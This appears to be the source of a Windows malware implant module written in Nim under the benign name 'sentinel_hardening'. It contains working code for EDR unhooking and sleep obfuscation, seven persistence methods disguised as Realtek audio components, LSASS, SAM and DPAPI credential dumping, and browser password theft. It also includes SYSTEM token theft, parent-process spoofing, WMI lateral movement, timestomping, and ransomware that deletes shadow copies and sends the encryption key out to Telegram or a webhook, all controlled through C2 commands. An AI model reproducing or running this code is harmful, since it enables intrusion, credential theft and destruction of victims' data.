# sentinel_hardening.nim

import std/[json, os, strutils, base64, tables, times]
import nimcrypto/sysrand
import nimcrypto/sha2
import winim/lean
import winim/inc/[windef, winbase, winuser, tlhelp32, winreg]
when defined(c2_ws) or defined(c2_both):
  import std/asyncdispatch

when defined(windows):
  proc peTextSection(hdr: pointer): tuple[base: pointer, size: int, ok: bool] =
    if hdr == nil: return (nil, 0, false)
    let dos = cast[ptr IMAGE_DOS_HEADER](hdr)
    if dos.e_magic != 0x5A4D'u16: return (nil, 0, false)
    let nt = cast[ptr IMAGE_NT_HEADERS64](cast[uint](hdr) + uint(dos.e_lfanew))
    let optOff = uint(cast[uint](nt) - cast[uint](hdr)) +
                 uint(4 + sizeof(IMAGE_FILE_HEADER))
    let sects = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](
      cast[uint](hdr) + optOff + uint(nt.FileHeader.SizeOfOptionalHeader))
    for i in 0..<int(nt.FileHeader.NumberOfSections):
      let s = addr sects[i]
      let name = $cast[cstring](unsafeAddr s.Name[0])
      if name == ".text":
        return (cast[pointer](cast[uint](hdr) + uint(s.VirtualAddress)),
                int(s.Misc.VirtualSize), true)
    return (nil, 0, false)

  proc unhookNtdll(): bool =
    try:
      let hSelf = GetModuleHandleA("ntdll.dll")
      if hSelf == 0: return false
      var hSec: HANDLE = 0
      var objName: UNICODE_STRING
      let nameBuf = newWideCString(r"\KnownDlls\ntdll.dll")
      objName.Buffer = cast[PWSTR](unsafeAddr nameBuf[0])
      objName.Length = uint16(nameBuf.len * 2)
      objName.MaximumLength = objName.Length + 2
      var oa: OBJECT_ATTRIBUTES
      oa.Length = DWORD(sizeof(OBJECT_ATTRIBUTES))
      oa.ObjectName = addr objName
      oa.Attributes = 0x40
      type NtOpenSection_t = proc(h: ptr HANDLE, access: ULONG,
                                  o: pointer): NTSTATUS {.stdcall.}
      let pOpen = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenSection")
      if pOpen == nil: return false
      let st = cast[NtOpenSection_t](pOpen)(addr hSec, 0x0004, addr oa)
      if st != 0 or hSec == 0: return false
      defer: discard CloseHandle(hSec)
      type NtMapView_t = proc(sec: HANDLE, procHandle: HANDLE,
                              base: ptr pointer, zero: ULONG_PTR,
                              size: ptr SIZE_T, inherit: ULONG,
                              allocAddr: pointer, protect: ULONG,
                              viewSize: ptr SIZE_T): NTSTATUS {.stdcall.}
      let pMap = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection")
      if pMap == nil: return false
      var cleanBase: pointer = nil
      var viewSize: SIZE_T = 0
      let ms = cast[NtMapView_t](pMap)(hSec, GetCurrentProcess(),
        cast[ptr pointer](addr cleanBase), 0, addr viewSize, 0, nil, 0x02,
        addr viewSize)
      if ms != 0 or cleanBase == nil: return false
      let (curText, curSize, curOk) = peTextSection(cast[pointer](hSelf))
      let (cleanText, cleanSize, cleanOk) = peTextSection(cleanBase)
      if not (curOk and cleanOk): return false
      let n = min(curSize, cleanSize)
      var oldProt: DWORD = 0
      if VirtualProtect(curText, SIZE_T(n), 0x40, addr oldProt) == 0:
        return false
      copyMem(curText, cleanText, n)
      var dummy: DWORD = 0
      discard VirtualProtect(curText, SIZE_T(n), oldProt, addr dummy)
      return true
    except: return false

  var
    gEkkoRegions: seq[tuple[a: pointer, s: int]]
    gEkkoCollected = false

  proc collectEncryptRegions() =
    if gEkkoCollected: return
    let hSelf = GetModuleHandleA(nil)
    if hSelf == 0: return
    let dos = cast[ptr IMAGE_DOS_HEADER](hSelf)
    if dos.e_magic != 0x5A4D'u16: return
    let nt = cast[ptr IMAGE_NT_HEADERS64](cast[uint](hSelf) + uint(dos.e_lfanew))
    let optOff = uint(cast[uint](nt) - cast[uint](hSelf)) +
                 uint(4 + sizeof(IMAGE_FILE_HEADER))
    let sects = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](
      cast[uint](hSelf) + optOff + uint(nt.FileHeader.SizeOfOptionalHeader))
    for i in 0..<int(nt.FileHeader.NumberOfSections):
      let s = addr sects[i]
      let name = $cast[cstring](unsafeAddr s.Name[0])
      if name == ".text" or name == ".data":
        let a = cast[pointer](cast[uint](hSelf) + uint(s.VirtualAddress))
        gEkkoRegions.add((a, int(s.Misc.VirtualSize)))
    gEkkoCollected = true

  proc rtlCrypt(region: pointer, size: int, encrypt: bool): bool =
    type Fn = proc(buf: pointer, len: ULONG, flags: ULONG): NTSTATUS {.stdcall.}
    let h = LoadLibraryA("advapi32.dll")
    if h == 0: return false
    let name = if encrypt: "SystemFunction040" else: "SystemFunction041"
    let pFn = GetProcAddress(h, name.cstring)
    if pFn == nil: return false
    const CHUNK = 240
    var off = 0
    while off < size:
      let n = min(CHUNK, size - off)
      let p = cast[pointer](cast[uint](region) + uint(off))
      if cast[Fn](pFn)(p, ULONG(n), 0) != 0: return false
      off += n
    return true

  proc ekkoSleep(ms: int) =
    if gEkkoRegions.len == 0: collectEncryptRegions()
    var ok = true
    for (a, s) in gEkkoRegions:
      if not rtlCrypt(a, s, true): ok = false
    sleep(ms)
    if ok:
      for (a, s) in gEkkoRegions:
        discard rtlCrypt(a, s, false)

  proc regWriteStr(root: HKEY, path, name, value: string): bool =
    var key: HKEY
    if RegCreateKeyExW(root, newWideCString(path), 0, nil, 0,
                       KEY_WRITE, nil, addr key, nil) != ERROR_SUCCESS:
      return false
    defer: discard RegCloseKey(key)
    let wv = newWideCString(value)
    return RegSetValueExW(key, newWideCString(name), 0, REG_SZ,
                          cast[ptr BYTE](wv[0].addr),
                          DWORD((value.len + 1) * 2)) == ERROR_SUCCESS

  proc installRunOncePersistence(): bool =
    regWriteStr(HKEY_CURRENT_USER,
      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
      "RealtekAudioInit", "\"" & getAppFilename() & "\"")

  proc installLogonScriptPersistence(): bool =
    regWriteStr(HKEY_CURRENT_USER, "Environment",
                 "UserInitMprLogonScript", getAppFilename())

  proc installScreensaverPersistence(): bool =
    let exe = getAppFilename()
    let scrDir = getEnv("APPDATA", "") / "Microsoft" / ("." & randomToken(6))
    let scrPath = scrDir / "screen.scr"
    try:
      createDir(scrDir)
      if not fileExists(scrPath): copyFile(exe, scrPath)
    except: return false
    var ok = regWriteStr(HKEY_CURRENT_USER, "Control Panel\\Desktop",
                          "SCRNSAVE.EXE", scrPath)
    if ok:
      discard regWriteStr(HKEY_CURRENT_USER, "Control Panel\\Desktop",
                           "ScreenSaveActive", "1")
      discard regWriteStr(HKEY_CURRENT_USER, "Control Panel\\Desktop",
                           "ScreenSaveTimeOut", "300")
    return ok

  proc installIfeoPersistence(): bool =
    if not isAdmin(): return false
    let exe = getAppFilename()
    var any = false
    for t in ["utilman.exe", "osk.exe", "magnify.exe",
              "narrator.exe", "DisplaySwitch.exe", "AtBroker.exe"]:
      let path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" &
                 "Image File Execution Options\\" & t
      if regWriteStr(HKEY_LOCAL_MACHINE, path, "Debugger",
                      "\"" & exe & "\""): any = true
    return any

  proc installScheduledTasksMultiple(): bool =
    if not isAdmin(): return false
    let exe = getAppFilename()
    for (name, trigger) in [("RealtekAudioUpdateLogon", "AtLogOn"),
                            ("RealtekAudioUpdateBoot",  "AtStartup")]:
      let script =
        "$a=New-ScheduledTaskAction -Execute '" & exe & "';" &
        "$t=New-ScheduledTaskTrigger -" & trigger & ";" &
        "$p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' " &
          "-LogonType ServiceAccount -RunLevel Highest;" &
        "$s=New-ScheduledTaskSettingsSet -Hidden -MultipleInstances IgnoreNew;" &
        "Register-ScheduledTask -TaskName '" & name & "' " &
          "-Action $a -Trigger $t -Principal $p -Settings $s " &
          "-Force -Hidden | Out-Null"
      try: discard execHidden(psRun(script))
      except: discard
    return true

  proc installWmiPersistence(): bool =
    if not isAdmin(): return false
    let exe = getAppFilename()
    let ps =
      "$ns='root\\subscription';" &
      "$q=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE " &
        "TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\";" &
      "$f=Set-WmiInstance -Class __EventFilter -Namespace $ns " &
        "-Arguments @{Name='RealtekUpdateF';EventNamespace='root\\cimv2';Query=$q};" &
      "$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace $ns " &
        "-Arguments @{Name='RealtekUpdateC';ExecutablePath='" & exe & "';" &
        "CommandLineTemplate='\"" & exe & "\"'};" &
      "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $ns " &
        "-Arguments @{Filter=$f;Consumer=$c}|Out-Null"
    try: discard execHidden(psRun(ps)); return true
    except: return false

  proc installStartupFolder(): bool =
    let startup = getEnv("APPDATA", "") /
                  "Microsoft\\Windows\\Start Menu\\Programs\\Startup" /
                  "RealtekAudio.exe"
    try:
      if not fileExists(startup): copyFile(getAppFilename(), startup)
      return true
    except: return false

  proc installFullPersistenceSuite(): string =
    var lines: seq[string] = @[]
    lines.add("run_once:       " & $installRunOncePersistence())
    lines.add("logon_script:   " & $installLogonScriptPersistence())
    lines.add("screensaver:    " & $installScreensaverPersistence())
    lines.add("ifeo:           " & $installIfeoPersistence())
    lines.add("tasks_multi:    " & $installScheduledTasksMultiple())
    lines.add("wmi:            " & $installWmiPersistence())
    lines.add("startup_folder: " & $installStartupFolder())
    return lines.join("\n")

  proc dumpLsassViaComsvcs(outPath: string): bool =
    var pid: int = 0
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == cast[HANDLE](-1) or snap == 0: return false
    var entry: PROCESSENTRY32W
    entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    if Process32FirstW(snap, addr entry) != 0:
      while true:
        if ($entry.szExeFile).toLowerAscii == "lsass.exe":
          pid = int(entry.th32ProcessID); break
        if Process32NextW(snap, addr entry) == 0: break
    discard CloseHandle(snap)
    if pid == 0: return false
    let cmd = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump " &
              $pid & " " & outPath & " full"
    discard execHidden(cmd)
    return fileExists(outPath)

  proc dumpSamHives(outDir: string): bool =
    try: createDir(outDir) except: discard
    var ok = true
    for hive in ["SAM", "SECURITY", "SYSTEM"]:
      let hivePath = outDir / (hive.toLowerAscii & ".hive")
      let (_, code) = execHidden("reg save HKLM\\" & hive & " \"" & hivePath & "\" /y")
      if code != 0: ok = false
    return ok

  proc dpapiMasterKeys(): string =
    let dst = stageDir() / "dpapi"
    createDir(dst)
    let src = getEnv("APPDATA", expandTilde("~")) / "Microsoft" / "Protect"
    if not dirExists(src): return "(no DPAPI dir)"
    var n = 0
    try:
      for f in walkFiles(src / "*"):
        if copyFileTo(f, dst / f.extractFilename): inc n
    except: discard
    return dst & " (" & $n & " keys)"

  proc harvestChromePasswords(): JsonNode =
    let dst = stageDir() / "chrome_creds"
    createDir(dst)
    var files: seq[string] = @[]
    let localApp = getEnv("LOCALAPPDATA", expandTilde("~"))
    for (sub, brand) in [("Google\\Chrome", "chrome"),
                         ("Microsoft\\Edge", "edge")]:
      let base = localApp / sub / "User Data"
      if not dirExists(base): continue
      for prof in ["Default", "Profile 1", "Profile 2"]:
        let pdir = base / prof
        if not dirExists(pdir): continue
        for db in ["Login Data", "Cookies", "Web Data"]:
          if fileExists(pdir / db):
            if copyFileTo(pdir / db, dst / brand / prof / db):
              files.add(brand & "/" & prof & "/" & db)
      if fileExists(base / "Local State"):
        if copyFileTo(base / "Local State", dst / brand / "Local State"):
          files.add(brand & "/Local State")
    return %* {"type": "creds", "kind": "browser", "staging": dst,
               "files": files, "count": files.len}

  proc enablePriv(name: string): bool =
    var hTok: HANDLE
    if OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
                        addr hTok) == 0: return false
    defer: discard CloseHandle(hTok)
    var luid: LUID
    if LookupPrivilegeValueA(nil, name.cstring, addr luid) == 0: return false
    var tp: TOKEN_PRIVILEGES
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = 2
    return AdjustTokenPrivileges(hTok, FALSE, addr tp, 0, nil, nil) != 0

  proc stealSystemToken(): HANDLE =
    discard enablePriv("SeDebugPrivilege")
    var pid: int = 0
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == cast[HANDLE](-1) or snap == 0: return 0
    var entry: PROCESSENTRY32W
    entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    if Process32FirstW(snap, addr entry) != 0:
      while true:
        if ($entry.szExeFile).toLowerAscii == "winlogon.exe":
          pid = int(entry.th32ProcessID); break
        if Process32NextW(snap, addr entry) == 0: break
    discard CloseHandle(snap)
    if pid == 0: return 0
    let hProc = OpenProcess(0x0400, FALSE, DWORD(pid))
    if hProc == 0: return 0
    defer: discard CloseHandle(hProc)
    var hTok: HANDLE = 0
    if OpenProcessToken(hProc, TOKEN_DUPLICATE or TOKEN_QUERY, addr hTok) == 0:
      return 0
    var hDup: HANDLE = 0
    if DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil, 2'i32, 1'i32, addr hDup) == 0:
      discard CloseHandle(hTok); return 0
    discard CloseHandle(hTok)
    return hDup

  proc spawnAsSystem(cmd: string): bool =
    let hTok = stealSystemToken()
    if hTok == 0: return false
    defer: discard CloseHandle(hTok)
    var si: STARTUPINFOW
    var pi: PROCESS_INFORMATION
    si.cb = DWORD(sizeof(STARTUPINFOW))
    si.dwFlags = 0x00000001
    si.wShowWindow = 0'u16
    if CreateProcessAsUserW(hTok, nil, newWideCString(cmd),
                            nil, nil, FALSE, 0x08000000,
                            nil, nil, addr si, addr pi) == 0:
      return false
    discard CloseHandle(pi.hProcess)
    discard CloseHandle(pi.hThread)
    return true

  proc spawnWithSpoofedParent(cmd, parentName: string): bool =
    var parentPid: int = 0
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == cast[HANDLE](-1) or snap == 0: return false
    var entry: PROCESSENTRY32W
    entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
    if Process32FirstW(snap, addr entry) != 0:
      while true:
        if ($entry.szExeFile).toLowerAscii == parentName.toLowerAscii:
          parentPid = int(entry.th32ProcessID); break
        if Process32NextW(snap, addr entry) == 0: break
    discard CloseHandle(snap)
    if parentPid == 0: return false
    let hParent = OpenProcess(0x0100, FALSE, DWORD(parentPid))
    if hParent == 0: return false
    defer: discard CloseHandle(hParent)
    var size: SIZE_T = 0
    discard InitializeProcThreadAttributeList(nil, 1, 0, addr size)
    let attrList = alloc0(size)
    defer: dealloc(attrList)
    if InitializeProcThreadAttributeList(
        cast[LPPROC_THREAD_ATTRIBUTE_LIST](attrList), 1, 0, addr size) == 0:
      return false
    defer: DeleteProcThreadAttributeList(
      cast[LPPROC_THREAD_ATTRIBUTE_LIST](attrList))
    if UpdateProcThreadAttribute(
        cast[LPPROC_THREAD_ATTRIBUTE_LIST](attrList), 0, 0x00020000,
        cast[pointer](addr hParent), SIZE_T(sizeof(HANDLE)), nil, nil) == 0:
      return false
    var si: STARTUPINFOEXW
    si.StartupInfo.cb = DWORD(sizeof(STARTUPINFOEXW))
    si.StartupInfo.dwFlags = 0x00000001
    si.StartupInfo.wShowWindow = 0'u16
    si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](attrList)
    var pi: PROCESS_INFORMATION
    if CreateProcessW(nil, newWideCString(cmd), nil, nil, FALSE,
                      0x00080000 or 0x08000000,
                      nil, nil, cast[LPSTARTUPINFOW](addr si), addr pi) == 0:
      return false
    discard CloseHandle(pi.hProcess)
    discard CloseHandle(pi.hThread)
    return true

  proc wmiLateralExec(target, user, pass, cmd: string): bool =
    let wmicCmd = "wmic /node:\"" & target & "\" /user:\"" & user &
                  "\" /password:\"" & pass & "\" process call create \"" &
                  cmd & "\""
    let (_, code) = execHidden(wmicCmd)
    return code == 0

  proc aesCtrXor(key, nonce: seq[byte], data: seq[byte]): seq[byte] =
    result = newSeq[byte](data.len)
    var ctr: uint32 = 0
    var off = 0
    while off < data.len:
      var ctx: sha256
      ctx.init()
      ctx.update(key)
      ctx.update(nonce)
      var ctrBytes: array[4, byte]
      ctrBytes[0] = byte(ctr and 0xFF)
      ctrBytes[1] = byte((ctr shr 8) and 0xFF)
      ctrBytes[2] = byte((ctr shr 16) and 0xFF)
      ctrBytes[3] = byte((ctr shr 24) and 0xFF)
      ctx.update(ctrBytes)
      var ks: array[32, byte]
      ctx.finish(ks)
      for i in 0..<32:
        if off + i >= data.len: break
        result[off + i] = data[off + i] xor ks[i]
      inc ctr
      off += 32

  proc encryptFile(path: string, key: seq[byte]): bool =
    try:
      let sz = getFileSize(path)
      if sz == 0 or sz > 100 * 1024 * 1024: return false
      let f = open(path, fmRead)
      defer: f.close()
      var plain = newSeq[byte](sz.int)
      discard f.readBuffer(addr plain[0], sz.int)
      var nonce: array[16, byte]
      discard randomBytes(addr nonce[0], 16)
      let ct = aesCtrXor(key, @nonce, plain)
      let outFile = path & ".locked"
      let g = open(outFile, fmWrite)
      defer: g.close()
      discard g.writeBuffer(addr nonce[0], 16)
      if ct.len > 0: discard g.writeBuffer(unsafeAddr ct[0], ct.len)
      return true
    except: return false

  proc runRansomware(): string =
    var masterKey: array[32, byte]
    discard randomBytes(addr masterKey[0], 32)
    let keyB64 = base64.encode(masterKey)
    if telegramEnabled(): discard sendToTg("[" & BuildPrefix & " ransom] key=" & keyB64)
    if webhookEnabled(): discard sendToHook("[" & BuildPrefix & " ransom] key=" & keyB64)
    try: writeFile(stageDir() / "ransom.key", keyB64) except: discard
    for s in ["VSS", "SWPRV", "wbengine", "SDRSVC", "Backup"]:
      discard execHidden("sc stop \"" & s & "\"")
      discard execHidden("sc config \"" & s & "\" start= disabled")
    discard execHidden("vssadmin delete shadows /all /quiet")
    discard execHidden("wmic shadowcopy delete /nointeractive")
    let exts = @[".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",
                 ".txt",".rtf",".csv",".jpg",".jpeg",".png",".zip",
                 ".rar",".7z",".sql",".db",".key",".pem"]
    var count = 0
    let skips = ["windows", "program files", "programdata",
                 "$recycle.bin", "system volume information"]
    proc walk(dir: string) =
      try:
        for kind, name in walkDir(dir):
          let full = dir / name
          var skip = false
          for s in skips:
            if full.toLowerAscii.contains(s): skip = true; break
          if skip: continue
          if kind == pcDir: walk(full)
          elif kind == pcFile:
            let ext = full.splitFile.ext.toLowerAscii
            if ext in exts:
              if encryptFile(full, @masterKey): inc count
      except: discard
    for d in ["C:\\", "D:\\"]:
      if dirExists(d): walk(d)
    return "encrypted " & $count & " files"

  proc resolveFromDeadDrop(): string = "(no dead drops configured)"

  proc timestomp(path, referencePath: string): bool =
    var hRef = CreateFileW(newWideCString(referencePath), 0x0080,
                           0x00000007, nil, 3, 0x80, 0)
    if hRef == INVALID_HANDLE_VALUE: return false
    defer: discard CloseHandle(hRef)
    var c, a, m: FILETIME
    if GetFileTime(hRef, addr c, addr a, addr m) == 0: return false
    var hUs = CreateFileW(newWideCString(path), 0x0100,
                          0x00000007, nil, 3, 0x80, 0)
    if hUs == INVALID_HANDLE_VALUE: return false
    defer: discard CloseHandle(hUs)
    return SetFileTime(hUs, addr c, addr a, addr m) != 0

when (defined(c2_ws) or defined(c2_both)) and defined(windows):
  proc hardeningCommandsWs(cmdName, cmdArgs: string,
                          sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
                         ): Future[bool] {.async.} =
    case cmdName
    of "unhook":
      let ok = unhookNtdll()
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] unhook: " & $ok})
      return true
    of "persist_all":
      await sendToC2(%* {"type": "output", "data": installFullPersistenceSuite()})
      return true
    of "lsass":
      let dumpPath = stageDir() / "lsass.dmp"
      let ok = dumpLsassViaComsvcs(dumpPath)
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] lsass: " & $ok & " -> " & dumpPath})
      return true
    of "sam":
      let hiveDir = stageDir() / "hives"
      let ok = dumpSamHives(hiveDir)
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] sam: " & $ok & " -> " & hiveDir})
      return true
    of "dpapi":
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] dpapi: " & dpapiMasterKeys()})
      return true
    of "browsercreds":
      await sendToC2(harvestChromePasswords())
      return true
    of "system":
      let ok = spawnAsSystem(cmdArgs)
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] system-exec: " & $ok})
      return true
    of "spoof":
      let ok = spawnWithSpoofedParent(cmdArgs, "explorer.exe")
      await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] spoof: " & $ok})
      return true
    of "lateral":
      let parts = cmdArgs.split(' ', 3)
      if parts.len < 4:
        await sendToC2(%* {"type": "output", "data": "[!] usage: lateral <host> <user> <pass> <cmd>"})
      else:
        let ok = wmiLateralExec(parts[0], parts[1], parts[2], parts[3])
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] lateral: " & $ok})
      return true
    of "ransom":
      if cmdArgs.strip() != "CONFIRM":
        await sendToC2(%* {"type": "output", "data": "[!] irreversible. resend: ransom CONFIRM"})
      else:
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] ransom starting"})
        let rep = runRansomware()
        await sendToC2(%* {"type": "output", "data": rep})
      return true
    of "drop":
      await sendToC2(%* {"type": "output", "data": resolveFromDeadDrop()})
      return true
    of "timestomp":
      let parts = cmdArgs.split(' ', 1)
      if parts.len < 2:
        await sendToC2(%* {"type": "output", "data": "[!] usage: timestomp <target> <reference>"})
      else:
        let ok = timestomp(parts[0], parts[1])
        await sendToC2(%* {"type": "output", "data": "[" & BuildPrefix & "] timestomp: " & $ok})
      return true
    else:
      return false
